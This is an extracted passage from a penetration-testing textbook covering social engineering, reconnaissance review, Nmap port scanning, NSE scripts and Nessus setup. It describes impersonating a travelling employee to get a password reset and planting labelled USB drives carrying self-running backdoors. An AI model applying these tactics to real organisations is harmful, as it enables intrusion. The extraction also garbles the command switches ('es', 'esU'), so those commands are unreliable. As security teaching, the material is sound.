[Word Count: 33]

Social engineering is the process of exploiting the “human” weakness that is
inherent in every organization. When utilizing social engineering, the attacker’s
goal is to get an employee to divulge some information that should be kept
conﬁdential.
[Word Count: 37]

Let us take our social engineering example one step further. Suppose our
salesman’s name is Ben Owned (we found this information during our recon-
naissance of the company website and in the signature of his e-mail response).
Let us assume that in this example, when you sent the employee the product
inquiry e-mail, you received an automatic reply with the notiﬁcation that Ben
Owned was “currently out of the ofﬁce travelling overseas” and “would be gone
for two weeks with only limited e-mail access.”
[Word Count: 84]

A classic example of social engineering would be to impersonate Ben Owned
and call the target company’s tech support number asking for help resetting your
password because you are overseas and cannot access your web mail. If you are
lucky, the tech support people will believe your story and reset the password.
Assuming they use the same password, you now have access to Ben Owned’s
e-mail and other network resources like VPN for remote access, or FTP for
uploading sales ﬁgures and customer orders.
[Word Count: 84]

Social engineering, like reconnaissance in general, takes both time and practice.
Not everyone makes a good social engineer. In order to be successful, you must
be supremely conﬁdent, knowledgeable of the situation, and ﬂexible enough to
go “off script”. If you are conducting social engineering over the phone, it can be
extremely helpful to have detailed and well-written notes in case you are asked
about some obscure detail.
[Word Count: 68]

Another example of social engineering is to leave USB thumb drives or
compact discs (CDs) at the target organization. The thumb drives should be
distributed to several locations in or near the organization. The parking lot,
the lobby, the bathroom, and an employee’s desk are all great “drop” loca-
tions. It is human nature for most people to insert the thumb drive or CD
[Word Count: 64]

The Basics of Hacking and Penetration Testing
48
[Word Count: 8]

into their PC just to see what is on the drive. In this example though, the
thumb drive or CD is preloaded with a self-executing backdoor program that
automatically launches when the drive is inserted into the computer. The
backdoor is capable of bypassing the company ﬁrewall and will dial home to
the attacker’s computer, leaving the target exposed and giving the attacker
a clear channel into the organization. We will discuss the topic of backdoors
in Chapter 6.
[Word Count: 79]

If you want to be even more successful in these types of attacks, try adding some labels
to your CDs or USB thumb drives. It is nearly impossible for someone to resist sneaking
a peak at a drive marked “Annual Employee Reviews” or “Q4 Reduction in Force Pro-
posal” or even just simply “Conﬁdential! Not for Public Disclosure!”
[Word Count: 58]

SIFTING THROUGH THE INTEL TO FIND
ATTACKABLE TARGETS
Once you have completed the steps above, you need to schedule some time to
closely review all the reconnaissance and information you have gathered. In
most cases, even light reconnaissance should produce a mountain of data. Once
the reconnaissance step is completed, you should have a solid understanding of
your target including the organization, structure, and even technologies
deployed inside the company.
[Word Count: 70]

While conducting the review process, it is a good idea to create a single list that
can be used as a central repository for recording IP addresses. You should also
keep separate lists that are dedicated to e-mail addresses, host names, and URLs.
[Word Count: 43]

Unfortunately, most of the data you collected will not be directly attackable.
During the process of reviewing your ﬁndings, be sure to transform any relevant,
non-IP-based information, into an IP address. Using Google and the host
command, you should be able to extract additional IPs that relate to your target.
Add these to the IP list.
[Word Count: 56]

After we have thoroughly reviewed the collected reconnaissance and trans-
formed the data into attackable targets, we should have a list of IPs that belong
to, serve, or are related to the target. As always, it is important to remember your
authorized scope because not all the IPs we collect will be within that range. As
a result, the ﬁnal step in reconnaissance is to review the IP list you just created
and either contact the company to determine if you can increase the scope of the
pen test or remove the IP address from your list.
[Word Count: 97]

At this point, you will be left with a list of IP addresses that you are authorized to
attack. Do not discard or underestimate all the nonattackable information you
have gathered. In each of the remaining steps, we will be reviewing and
extracting information from Step 1.
[Word Count: 47]

Now that you have a solid understanding of the basic tools and techniques used
to conduct reconnaissance, you will need to practice everything that was cov-
ered. There are many ways to go about practicing this step. One simple and
effective idea is to make a list of companies by reading a newspaper. If you do
not have access to a newspaper, any popular news website will do, like www.cnn.
com, www.msnbc.com, etc.
[Word Count: 73]

Once you have practiced and mastered the basics of reconnaissance, you will be
armed with enough information and skill to tackle advanced topics in infor-
mation gathering. Below you will ﬁnd a list of tools and techniques that will take
your information-gathering ability to the next level.
[Word Count: 47]

Begin the process of expanding your skills by learning search engine directives
for sites other than Google. As we mentioned earlier, there are many different
search engines and mastering the language of each is important. Most modern
search engines include directives or other ways to complete advanced searches.
Remember you should never rely on a single search engine to do all of your
reconnaissance. Searching for the same keywords in different search engines
often returns drastically different and surprisingly useful results.
[Word Count: 81]

Once you understand the basics, it is deﬁnitely worth your time to review
Johnny Long’s GHDB. This is a single repository for some of the most effective
[Word Count: 27]

The Basics of Hacking and Penetration Testing
50
[Word Count: 8]

and feared Google Hacks in existence today! It has already been mentioned and
should go without saying but Do Not Run These Queries Against Unauthorized
Targets! You can ﬁnd the GHDB at http://www.hackersforcharity.org/ghdb.
While you are there, take a minute to read about Hackers for Charity and
Johnny’s efforts with the “food for work” program.
[Word Count: 55]

Paterva’s Maltego is a very powerful tool that aggregates information from public
databases and provides shockingly accurate details about your target organiza-
tion. These details can be technical in nature, such as the location or IP address
of your ﬁrewall, or they can be personal, such as the physical location of your
currently (travelling) salesman. Learning to master Maltego takes a little effort
but is well worth your time. A free version is available in Kali.
[Word Count: 76]

Finally, it is worth your time to explore the “Swiss Army Knife Internet Tool”
Robtex. This site is often a one-stop shop for information gathering because it is
so versatile and provides so much information.
[Word Count: 35]

Information gathering is the ﬁrst step in any penetration test or hack. Even
though this phase is less technical than most, its importance should not be
overlooked. The more information you are able to collect, the better your
chances of success in later phases of the penetration test. At ﬁrst, the amount of
information that can be gathered on your target can seem a bit overwhelming,
but with a good documentation process, the proper use of tools, and further
practice you will soon master the art of reconnaissance.
[Word Count: 88]

n
Nmap: Port Scanning and Service Detection
[Word Count: 7]

Once step 1 has been completed, you should have a solid understanding of the
target and a detailed collection of gathered information. These data mainly
include our collection of Internet protocol (IP) addresses. Recall that one of the
ﬁnal steps in reconnaissance was to create a list of IP addresses that both
belonged to the target and that we were authorized to attack. This list is the key
to transitioning from step 1 to step 2. In step 1, we mapped our gathered
[Word Count: 83]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00003-0
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

information to attackable IP addresses. In step 2, we will map IP addresses to
open ports and services.
[Word Count: 18]

Each of the examples in this chapter will be run from Kali against either the Windows XP
or Metasploitable VM. Once you have downloaded and extracted Metasploitable, you may
need to change the networking settings in the VMware Player conﬁguration setting from
“bridged” to “NAT”. Once you make this change, reboot the Metasploitable VM. At this
point, you will be presented with a login screen similar to Kali. However, unlike Kali, you
will not be provided with a user name or password. Your goal is to compromise the
Metasploitable VM and gain remote access to the system.
[Word Count: 97]

It is important to understand that it is the job of most networks to allow at least
some communication to ﬂow into and out of their borders. Networks that exist
in complete isolation with no Internet connection and no services like e-mail or
web trafﬁc are very rare today. Each service, connection, or route to another
network provides a potential foothold for an attacker. Scanning is the process of
identifying live systems and the services that exist on those systems.
[Word Count: 80]

For the purpose of our methodology, we will break step 2 into four distinct
phases:
[Word Count: 15]

2.1. Determining if a system is alive with ping packets.
2.2. Port scanning the system with Nmap.
2.3. Leveraging the Nmap scripting engine (NSE) to further interrogate the
target.
2.4. Scanning the system for vulnerabilities with Nessus.
[Word Count: 37]

Later in this chapter, we will discuss tools that combine these phases into a single
process; however, for the purpose of introducing and learning new material, it is
best to cover them separately.
[Word Count: 33]

Step 2.2 is the process of identifying the speciﬁc ports and services running
a particular host.
[Word Count: 16]

Simply deﬁned, ports provide a way or location for software, services, and net-
works to communicate with hardware like a computer. A port is a data connection
that allows a computer to exchange information with other computers, software,
or devices. Prior to the interconnection of computers and networks, information
[Word Count: 49]

The Basics of Hacking and Penetration Testing
54
[Word Count: 8]

was passed between machines through the use of physical media like ﬂoppy
drives. Once computers were connected to a network, they needed an efﬁcient
means for communicating with each other. Ports were the answer. The use of
multiple ports allows for simultaneous communication without the need to wait.
[Word Count: 48]

To further clarify this point for those of you who are unfamiliar with ports and
computers, it may be helpful to consider the following analogy: think of your
computer as a house. There are many different ways that a person can enter the
house. Each of the different ways to enter your house (computer) is like
a computer port. Just like a port on a computer, all the entryways allow trafﬁc to
ﬂow into and out of your home.
[Word Count: 79]

Imagine a house with unique numbers over each of the potential entry points.
Most people will use the front door. However, the owners may come in through
the garage door. Sometimes, people enter the house from a backdoor or sliding
glass door off the deck. An unconventional person may climb through a window
or attempt to squeeze through the doggie door!
[Word Count: 61]

Regardless of how you get into your house, each of these examples corresponds
nicely with the analogy of computers and ports. Recall that ports are like gate-
ways to your computer. Some ports are more common and receive lots of trafﬁc
(just like your front door); others are more obscure and rarely used (by humans)
like the doggie door.
[Word Count: 59]

Many common network services run on standard port numbers and can give
attackers an indication as to the function of the target system. Table 3.1 provides
a list of common ports and their corresponding services.
[Word Count: 35]

Obviously, there are many more ports and services. However, this list serves as
a basic introduction to common ports that are utilized by organizations today.
You will see these services repeatedly as you begin to port scan your targets.
[Word Count: 39]

We need to pay special attention to the discovery of any open ports on our target
systems. You should make detailed notes and save the output of any tool run in
step 2.2. Remember every open port is a potential gateway into the target system.
[Word Count: 45]

Step 2.3 leverages the NSE to further interrogate and verify our earlier ﬁndings.
The NSE is a tremendously powerful and simple tool, which extends the power
and ﬂexibility of Nmap. It gives hackers and penetration testers the ability to
use precanned or custom scripts, which can be used to verify ﬁndings, discover
new processes and vulnerabilities, and automate many penetration testing
techniques.
[Word Count: 62]

The ﬁnal step in our scanning method is step 2.4, vulnerability scanning.
Vulnerability scanning is the process of locating and identifying known weak-
nesses in the services and software running on a target machine. The discovery of
known vulnerabilities on a target system can be a bit like winning the lottery or
hitting a blackjack in Vegas. It is deﬁnitely a win for the penetration tester. Many
systems today can be exploited directly with little or no skill when a machine is
discovered to have a known vulnerability.
[Word Count: 88]

It is important to mention that there is a difference in the severity of various
vulnerabilities. Some vulnerabilities may present little opportunities for an
attacker, whereas others will allow you to completely take over and control
a machine with a single click of a button. We will discuss the various levels of
vulnerabilities in more detail later in this chapter.
[Word Count: 60]

The process of compromising one machine and then using that machine as a stepping
stone to attack another machine is called “pivoting”. Pivoting is most often used when
the target machine is attached to a network but not directly reachable from our current
location. Hackers and penetration testers may have to pivot several times before having
direct access to the original target.
[Word Count: 62]

Table 3.1
Common Port Numbers and Their
Corresponding Service
[Word Count: 9]

20
FTP data transfer
21
FTP control
22
SSH
23
Telnet
25
SMTP (e-mail)
53
DNS
80
HTTP
137e139
NetBIOS
443
HTTPS
445
SMB
1433
MSSQL
3306
MySQL
3389
RDP
5800
VNC over HTTP
5900
VNC
[Word Count: 36]

The Basics of Hacking and Penetration Testing
56
[Word Count: 8]

Perimeter devices are computers, servers, routers, ﬁrewalls, or other equipment,
which sit at the outer edge of a protected network. These devices serve as an
intermediary between protected internal resources and external networks like
the Internet.
[Word Count: 36]

As previously mentioned, we often begin by scanning the perimeter devices to
look for weaknesses or vulnerabilities that will allow us to gain entry into the
network. Once we have successfully gained access (which we will discuss in
Chapter 4), the scanning process can be repeated from the newly owned
machine, in order to ﬁnd additional targets. This cyclical process allows us to
create a very detailed internal network map and discover the critical infra-
structure hiding behind the corporate ﬁrewall.
[Word Count: 81]

You will need to replace the “target_ip” portion of the command with the actual
IP address or hostname of the machine you are trying to ping.
[Word Count: 26]

The ﬁrst line in Figure 3.1 shows the ping command being issued. All modern
versions of Linux and Windows include the ping command. The major differ-
ence between the Linux and Windows version is that by default, the Windows
[Word Count: 39]

FIGURE 3.1
An example of the ping command.
[Word Count: 8]

ping command will send four echo request packets and automatically terminate,
whereas the Linux ping command will continue to send echo request commands
until you force it to stop. On a Linux system, you can force a ping command to
stop sending packets by using the Ctrl þ C combination.
[Word Count: 50]

Let us focus our attention on the third line that starts with “64 bytes from”. This
line is telling us that our ICMP echo request packet successfully reached
the target host and that the host successfully sent a reply packet back to our
machine. The “64 bytes” indicates the size of the response packet. The “from
[Word Count: 56]

The simplest way to run a ping sweep is with a tool called FPing. FPing is built
into Kali and is run from the terminal. The tool can also be downloaded for
Windows. The easiest way to run FPing is to open terminal window and type the
following command:
[Word Count: 49]

fping ea eg 172.16.45.1 172.16.45.254>hosts.txt
[Word Count: 5]

The Basics of Hacking and Penetration Testing
58
[Word Count: 8]

the contents of a ﬁle in the current terminal window. To view the contents of the
hosts.txt, enter the following command into your terminal:
[Word Count: 24]

There are many other switches that can be used to change the functionality of the
FPing command. You can view them all byutilizing the man page as shown below:
[Word Count: 29]

Once you have run the command above, you can open the hosts.txt ﬁle that was
created to ﬁnd a list of target machines that responded to our pings. These IP
addresses should be added to your target list for later investigation. It is
important to remember that not every host will respond to ping requests; some
hosts may be ﬁrewalled or otherwise blocking ping packets.
[Word Count: 65]

There are a total of 65,536 (0e65,535) ports on every computer. Ports can be
either transmission control protocol (TCP) or user datagram protocol (UDP)
depending on the service utilizing the port or nature of the communication
occurring on the port. We scan computers to see what ports are in use or open.
This gives us a better picture of the purpose of the machine, which, in turn, gives
us a better idea about how to attack the box.
[Word Count: 78]

If you had to choose only one tool to conduct port scanning, you would un-
doubtedly choose Nmap. Nmap was written by Gordon “Fyodor” Lyon and is
available for free from www.insecure.org. It is built into many of today’s Linux
distributions including Kali. Although it is possible to run Nmap from
a graphical user interface (GUI), we are going to focus on using the terminal to
run our port scans.
[Word Count: 70]

People who are new to security and hacking often ask why they should learn to
use the command line or terminal version of a tool rather than relying on a GUI.
The same people often complain that using the terminal is not as easy. The
response is very simple. First, using the command line version of a tool will
allow you to learn the switches and options that change the behavior of your
tool. This gives you more ﬂexibility, more granular control, and a better un-
derstanding of the tool you are running. It is also important to understand that
[Word Count: 100]

hacking rarely works like it is portrayed in the movies (more on this point
later!). Finally, the command line can be easily scripted allowing us to extend
and expand the tool’s original functionality. Scripting and automation become
key when you want to advance your skill set to the next level.
[Word Count: 50]

One last point on the importance of learning to control tools through the command line;
earlier we introduced the concept of pivoting, rarely do GUI tools and pivoting mix. In most
cases, once you compromise a computer and need to pivot off of it, you will be working
from a remote terminal. In these cases, understanding how to utilize the command line
version of each tool is critical.
[Word Count: 68]

When we conduct a port scan, our tool will literally create a packet and send it to
each designated port on the machine. The goal is to determine what kind of
a response we get from the target port. Different types of port scans can produce
different results. It is important to understand the type of scan you are running
as well as the expected output of that scan.
[Word Count: 69]

THE THREE-WAY HANDSHAKE
When two machines on any given network want to communicate using TCP,
they do so by completing the three-way handshake. This process is very similar
[Word Count: 28]

The Basics of Hacking and Penetration Testing
60
[Word Count: 8]

to a phone conversation (at least before everyone had caller ID!). When you
want to talk to someone, you pick up the phone and dial the number, the
receiver picks up the ringing phone not knowing who the caller is and says
“Hello?”, the original caller then introduces himself by saying “Hi, this is Dave
Kennedy!” In response to this, the receiver will often acknowledge the caller by
saying “Oh, hi Dave!” At this point both people have enough information for
the conversation to continue as normal.
[Word Count: 87]

USING NMAP TO PERFORM A TCP CONNECT SCAN
[Word Count: 8]

The ﬁrst scan we will look at is called the TCP Connect scan. This scan is often
considered the most basic and stable of all the port scans because Nmap at-
tempts to complete the three-way handshake on each port speciﬁed in the Nmap
command. Because this scan actually completes the three-way handshake and
then tears down the connection gracefully, there is little chance that you will
ﬂood the target system and cause it to crash.
[Word Count: 76]

To run a TCP connect, we issue the following command from a terminal:
[Word Count: 13]

system were alive and responding to ping requests. Finally, we specify the
target IP address; obviously, your target’s IP address will be different from
the one shown in the screenshot! Figure 3.2 shows the TCP Connect Nmap
scan and the output that was received when run against the Metasploitable
target.
[Word Count: 50]

Oftentimes, we need to run our scans against an entire subnet, or range of IP
addresses. When this is the case, we can instruct Nmap to scan a continuous
range of IPs by simply appending the last octet (or octets) of the ending IP
address onto the scan like so:
[Word Count: 50]

Issuing this command will cause Nmap to port scan all the hosts between the IP
addresses 192.168.18.1 and 192.168.18.254. Just like ping sweeps, this is
a very powerful technique that can greatly improve the productivity of your
scanning life!
[Word Count: 39]

If you need to scan a series of hosts that are not in sequential order, you can
create a text ﬁle and list each host IP address on a single line. Then add the “eiL
[Word Count: 35]

path_to_the_text_file” switch to your Nmap command. Doing this allows you
to scan all your target hosts from a single command. Whenever possible, always
try to create a single text ﬁle containing all your target IPs. Most of the tools we
discuss have a switch or mechanism for loading this text ﬁle. Having a list saves
the effort or retyping, but more importantly, reduces the number of times you
will type each IP address and therefore diminishes the chance that you will fat-
ﬁnger the IP address and scan the wrong target.
[Word Count: 91]

FIGURE 3.2
TCP connect scans and results.
[Word Count: 7]

The Basics of Hacking and Penetration Testing
62
[Word Count: 8]

The SYN Scan is arguably the most popular Nmap port scan. There are many
reasons for its popularity, including the fact that it happens to be the default
Nmap scan. If you run the Nmap command without specifying a scan type
(using the es switch), Nmap will use the SYN scan by default.
[Word Count: 53]

Aside from the fact that the SYN scan is the default choice, it is also popular
because it is faster than the TCP connect scan and yet remains quite safe, with
little chance of (Denial of Service) DoS’ing or crashing the target system. SYN
scans are faster because rather than completing the entire three-way handshake,
it only completes the ﬁrst two steps of the process.
[Word Count: 65]

If we consider the example of comparing the three-way handshake to a phone
call, SYN scans would be like calling someone up, having the receiver pick up the
phone and saying “Hello?”, and then simply hanging up on the person without
a single word.
[Word Count: 44]

Because the SYN scan is the default Nmap scan, we do not technically need to
specify the scan type with the “es” switch. However, because this book focuses on
the basics, it is worth the effort to get into the habit of specifying your scan type.
[Word Count: 46]

To run an SYN scan, you can open a terminal window and issue the following
command:
[Word Count: 16]

Take a moment to compare the total run time between the two scans in Figures
3.2 and 3.3. Even in our simple environment against a single host, the SYN scan
completed its execution faster.
[Word Count: 34]

One of the most common port scanning mistakes of new penetration testers is
that they overlook UDP. These aspiring hackers oftentimes ﬁre up Nmap, run
a single scan (typically an SYN scan), and move onto vulnerability scanning. Do
not neglect to scan UDP ports! Failing to scan your target for open UDP ports is
like reading the Cliff Notes version of a book. You will probably have a solid
understanding of the story, but you are likely to miss many of the details.
[Word Count: 83]

It is important to understand that both TCP Connect scans and SYN scans use
TCP as the basis for their communication. Computers can communicate with
one another using either TCP or UDP; however, there are several key differences
between the two protocols.
[Word Count: 42]

The Basics of Hacking and Penetration Testing
64
[Word Count: 8]

Now that you have a very simple understanding of the difference between TCP
and UDP, it is important to remember that not every service utilizes TCP. Several
prominent services make use of UPD including dynamic host conﬁguration
protocol, domain name system (for individual lookups), simple network
management protocol, and trivial ﬁle transfer protocol. One of the most
important traits for a penetration tester to have is thoroughness. It will be quite
embarrassing to you if you overlook or miss a service because you forgot to run
a UDP scan against your target.
[Word Count: 92]

Both the TCP Connect scan and the SYN scan use TCP as the basis for their
scanning techniques. If we want to discover services utilizing UDP, we need to
instruct Nmap to create scans using UDP packets. Fortunately, Nmap makes this
process very simple. To run a UDP scan against our target, we would enter the
following command in a terminal:
[Word Count: 61]

Notice the difference between this command and the others we have learned.
First, we specify the Nmap UDP scan by using the “esU” command. Astute
readers will also notice that the “-p-“ and the “-Pn” switches have been dropped
from the scan. The reason for this is simple. UDP scans are very slow; running
even a basic UDP scan on the default 1000 ports can take a signiﬁcant amount of
time. Once again it is worthwhile to compare the total scan time between Figures
3.3 and 3.4. Figure 3.4 shows the output of the UDP scan.
[Word Count: 96]

It is important to remember that UDP communication does not require
a response from the receiver. If the target machine does not send back a reply
[Word Count: 26]

This conundrum makes it very difﬁcult for Nmap to determine if a UDP port is
open or ﬁltered. As a result, when Nmap does not receive a response from a UDP
scan, it returns the following message for the port “open j ﬁltered.” It is
important to note that on rare occasions a UDP service will send a response back
to the original source. In these cases, Nmap is smart enough to understand that
there is clearly a service listening and responding to requests and will mark those
ports as “open”.
[Word Count: 91]

As was discussed earlier, oftentimes people who are new to port scanning
overlook UDP scans. This is probably due in part to the fact that most ordinary
UDP port scans provide very little information and mark nearly every port as
“open j ﬁltered”. After seeing the same output on several different hosts, it is easy
to become disillusioned with UDP scans. However, all is not lost! The ﬁne folks
who wrote Nmap provide us with a way to draw more accurate results from our
UDP scans.
[Word Count: 86]

To elicit a more useful response from our target, we can add the “esV” switch to
our UDP scan. The “esV” switch is used for version scanning but, in this case,
can also help us narrow the results of our UPD scan.
[Word Count: 42]

When version scanning is enabled, Nmap sends additional probes to every
“open j ﬁltered” port that is reported by the scan. These additional probes
attempt to identify services by sending speciﬁcally crafted packets. These spe-
cially crafted packets are often much more successful in provoking a response
[Word Count: 47]

The Basics of Hacking and Penetration Testing
66
[Word Count: 8]

from the target. Oftentimes, this will change the reported results from “open j
ﬁltered” to “open”.
[Word Count: 16]

As mentioned above, the simplest way to add version scanning to a UDP probe is
to include the “esV” switch. Please note that because we are already using the
“esU” switch to specify the type of scan, we can simply append the capital V
onto the back of the “esU”. As a result, our new command becomes
[Word Count: 57]

In the computer world, a request for comments (RFC) is a document that
contains either notes or the technical speciﬁcations covering a given technology
or standard. RFCs can provide us with a tremendous amount of detail about the
inner workings of a particular system. Because RFCs describe the technical de-
tails of how a system should work, attackers and hackers will often review RFCs
looking for potential weaknesses or loopholes described in the documentation.
Xmas tree scans and null scans exploit just such a loophole.
[Word Count: 85]

The TCP RFC says that if a closed port receives a packet that does not have an SYN,
ACK, or RST ﬂag set (i.e. the type of packet that is created from an Xmas tree scan),
the port should respond with an RST packet of its own. Furthermore, the RFC states
that if the port is open and it receives a packet without an SYN, ACK, or RST ﬂag set,
the packet should be ignored. Take a moment to reread the last two sentences, as
they are critical to understanding the response we get from these scans.
[Word Count: 97]

Assuming the operating system of the target fully complies with the TCP RFC,
Nmap is able to determine the port state without completing or even initiating
a connection on the target system. The word “assuming” was used because not
every operating system on the market today is fully RFC compliant. In general, the
Xmas tree and null scans work against Unix and Linux machines but not Windows.
As a result, Xmas tree and null scans are rather ineffective against Microsoft targets.
[Word Count: 81]

To execute an Xmas tree scan, we simply replace the “esU” switch from our last
example with an “esX”. To run the full scan in the terminal, we would enter
[Word Count: 30]

Figure 3.5 shows the command and output of a Xmas tree scan against our
Linux target.
[Word Count: 16]

USING NMAP TO PERFORM NULL SCANS
Null scans, like Xmas tree scans, are probes made with packets that violate tra-
ditional TCP communication. In many ways, the null scan is the exact opposite
of a Xmas tree scan because the null scan utilizes packets that are devoid of any
ﬂags (completely empty).
[Word Count: 52]

Target systems will respond to null scans in the exact same way they respond to
Xmas tree scans. Speciﬁcally, an open port on the target system will send no
response back to Nmap, whereas a closed port will respond with an RST packet.
It is important to remember that these scans are only reliable for operating
systems that comply 100% with the TCP RFC.
[Word Count: 64]

One of the main advantages of running Xmas tree and null scans is that in some
cases, you are able to bypass simple ﬁlters and access control lists. Some of these
primitive ﬁlters work by blocking inbound SYN packets. The thought with this
type of ﬁlter is that by preventing the SYN packet from entering the system, it is
not possible for the three-way handshake to occur. If the three-way handshake
does not occur, there can be no TCP communication streams between the sys-
tems, or more precisely, no TCP communications can be originated from outside
of the ﬁlter.
[Word Count: 99]

It is important to understand that neither the Xmas tree nor the null scans seek
to establish any type of communication channel. The whole goal of these scans
is to determine if a port is open or closed.
[Word Count: 38]

The Basics of Hacking and Penetration Testing
68
[Word Count: 8]

This scenario is possible because Nmap creates packets without the SYN ﬂag set.
Because the ﬁlter is only dropping incoming packets with the SYN ﬂag, the Xmas
tree and null packets are allowed through. To run a null scan, we issue the
following command in a terminal:
[Word Count: 47]

THE NMAP SCRIPTING ENGINE: FROM CATERPILLAR
TO BUTTERFLY
Make no mistake. Nmap is an awesome tool. It is mature, robust, well docu-
mented, and supported by an active community. However, the NSE provides
Nmap with an entirely new skill set and dimension. The NSE is a powerful
addition to the classic tool that transforms its functionality and capability well
beyond its traditional port scanning duties.
[Word Count: 65]

Learning to utilize the NSE is critical to getting the most out of Nmap. When
properly implemented, the NSE allows Nmap to complete a variety of tasks
including vulnerability scanning, advanced network discovery, detection of
backdoors, and in some cases even perform exploitation! The NSE community is
a very active and open group. New scripts and capabilities are being constantly
added. If you use the NSE to create something new, I encourage you to share
your work.
[Word Count: 77]

In order to keep things simple, the NSE divides the scripts by category. The current
categories include auth, broadcast, brute, default, discovery, dos, exploit, external,
fuzzer, intrusive, malware, safe, version, and vuln. Each category can be further
broken down into individual scripts that perform a particular function. A hacker
or penetration tester can run a single script or the entire category (which includes
multiple scripts). It is important to review the documentation for each category
and script before invoking them or using them against a target. You can ﬁnd the
most recent and up-to-date NSE information at http://nmap.org/nsedoc/.
[Word Count: 98]

The NSE and its scripts are prebuild into Nmap. There is nothing for you to install or
conﬁgure.
[Word Count: 18]

In order to invoke the NSE, we use “--script” argument followed by the cat-
egory or script name and the target IP address as shown below:
[Word Count: 26]

The “banner” script is an extension of Nmap that creates a connection to
a TCP port and prints any output sent from the target system to the local
terminal. This can be extremely helpful in identifying unrecognized services on
obscure ports.
[Word Count: 41]

Similarly we could invoke an entire family or category of scripts by using the
“--script category_name” format as shown below:
[Word Count: 20]

The Basics of Hacking and Penetration Testing
70
[Word Count: 8]

Now that we have covered the basics of port scanning, there are a few additional
switches that need to be covered. These switches provide extended functionality
that may be useful to you as you progress in your penetration testing career.
[Word Count: 40]

As mentioned earlier, the “esV” switch is used for version scanning. When
conducting version scanning, Nmap sends probes to the open port in an attempt
to determine speciﬁc information about the service that is listening. When
possible, Nmap will provide details about the service including version numbers
and other banner information. This information should be recorded in your
notes. It is recommended that you use the “esV” switch whenever possible,
especially on unusual or unexpected ports, because a wily administrator may
have moved his web server to port 34567 in an attempt to obscure the service.
[Word Count: 96]

Nmap includes an option to change the speed of your port scan. This is done
with the “eT” switch. The timing switch ranges on a numeric scale from 0 to 5,
with 0 being the slowest scan and 5, the fastest. Timing options can be extremely
useful depending on the situation. Slow scans are great for avoiding detection
while fast scans can be helpful when you have a limited amount of time or large
number of hosts to scan. Please be aware that by using the fastest scans possible,
Nmap may provide less accurate results.
[Word Count: 95]

Last, the “eO” switch can be useful for ﬁngerprinting the operating system. This is
handy for determining if the target you are attacking is a Windows, Linux, or
other type of machine. Knowing the operating system of your target will save you
time by allowing you to focus your attacks to known weaknesses of that system.
There is no use in exploring exploits for a Linux machine if your target is running
Windows.
[Word Count: 73]

In this example, the “target_ip” is the IP address of your victim. Most likely these
will fail, but on the rare occasion when you are successful, they are an absolute
home run.
[Word Count: 32]

Now that we have a list of IPs, open ports, and services on each machine, it is
time to scan the targets for vulnerabilities. Vulnerability is a weakness in the
software or system conﬁguration that can often be exploited. Vulnerabilities can
come in many forms but most often they are associated with missing patches.
Vendors often release patches to ﬁx a known problem or vulnerability.
Unpatched software and systems often lead to quick penetration tests because
some vulnerabilities allow remote code execution. Remote code execution is
deﬁnitely one of the holy grails of hacking.
[Word Count: 94]

Remote code execution allows an attacker or penetration tester to fully and completely
control the remote computer as if he/she were physically sitting in front of it. This
includes, but is not limited to, copying, editing, and deleting documents or ﬁles, installing
new programs, making changes or disabling defensive products like ﬁrewalls and anti-
virus, setting up key loggers or backdoors, and using the newly compromised computer to
attack new machines.
[Word Count: 71]

It is important to understand this step, as the results will feed directly into step
3 where we will attempt to exploit and gain access to the system. To scan
systems for vulnerabilities, we will use a vulnerability scanner. There are
several good scanners available to you but for this book we will be focusing
on Nessus.
[Word Count: 57]

Installing Nessus is very straightforward. It runs on all major operating sys-
tems including Linux, Windows, OS X, FreeBSD and more. Nessus runs using
a client/server architecture, which allows you to have multiple clients, connect
to the server instance if you want to. Once set up, the server runs quietly in
the background, and you interact with the server through a browser. There are
many good tutorials on the Internet for installing Nessus on Kali (or any
Linux system). In general, to install Nessus, you need to complete the
following steps:
[Word Count: 91]

1.
Download the installer from www.nessus.org.
2.
Register for a noncommercial HomeFeed key on the Nessus website by
submitting your e-mail address. The Nessus crew will e-mail you a unique
product key that can be used to register the product. Please be sure to pay
[Word Count: 45]

The Basics of Hacking and Penetration Testing
72
[Word Count: 8]

special attention to the end-user license agreement that restricts how
a HomeFeed can be used.
3.
Install the program.
4.
Create a Nessus user to access the system.
5.
Enter your HomeFeed (or Professional) key.
6.
Update the plug-ins.
7.
Use a browser to connect to the Nessus server.
[Word Count: 49]

Installing Nessus on Backtrack or Kali is straightforward. You can either use the “apt-get”
command or you download the .deb package from the Nessus site, .deb ﬁles can be
installed using the command:
[Word Count: 33]

If you are running Kali or Backtrack, you can install via “apt-get” by simply opening
a terminal and issue the command as shown below:
[Word Count: 24]

Next set up a Nessus user by entering the following command into the terminal window:
[Word Count: 15]

After issuing the “nessus-adduser” command, you will be asked to choose a user name
and password. Be sure to answer each question pertaining to the Nessus user setup.
Once a user has been created, you need to activate your registration key. To activate your
registration key, run the following commands in a terminal window:
[Word Count: 54]

/opt/nessus/bin/nessus-fetch --register your_reg_key
[Word Count: 3]

You will need to replace “your_reg_key” with the key you received from Tenable. The
Nessus key is only good for a single installation; if you need to reinstall, you will have to
register for a new key. After entering this command, you will need to wait several minutes
while the initial plug-ins are downloaded to your local machine. Once all the plug-ins have
been successfully downloaded, you can start the Nessus server by running the following
command:
[Word Count: 77]

When you reboot your attacker machine and attempt to access Nessus through
a browser, you may see an “Unable to Connect” error message. If this happens, open
a terminal and reissue the “/etc/init.d/nessusd start” command.
[Word Count: 35]

One of the key components of Nessus is the plug-ins. A plug-in is a small block
of code that is sent to the target machine to check for a known vulnerability.
Nessus has literally thousands of plug-ins. These will need to be downloaded the
ﬁrst time you start the program. The default installation will set up Nessus to
automatically update the plug-ins for you.
[Word Count: 64]

Once you have installed the Nessus server, you can access it by opening
a browser and entering https://127.0.0.1:8834 in the uniform resource locator
[Word Count: 23]

FIGURE 3.7
Setting up a “safe” scan option in conﬁgurations.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
74
[Word Count: 8]

You will want to set up safe checks in most cases (which is enabled by default).
The reason for this is simple. Some plug-ins and checks are considered dan-
gerous because they check for the vulnerability by attempting to actually exploit
the system. Be aware that removing the “Safe Checks” check has the potential to
cause network and system disruptions or even take systems ofﬂine. By ensuring
that you have “Safe Checks”, you can avoid unintentional network disruptions.
[Word Count: 78]

Once your scan policy is set, you can save it by clicking the “Update” button. You
only need to set up your scan policy one time. Once your scan has been sub-
mitted, you will be able to use that policy to perform vulnerability scans against
your target.
[Word Count: 48]

Now that you have a policy setup, you can run a scan against your target. To set
up a scan, you need to click the “Scans” link located in the top menu followed by
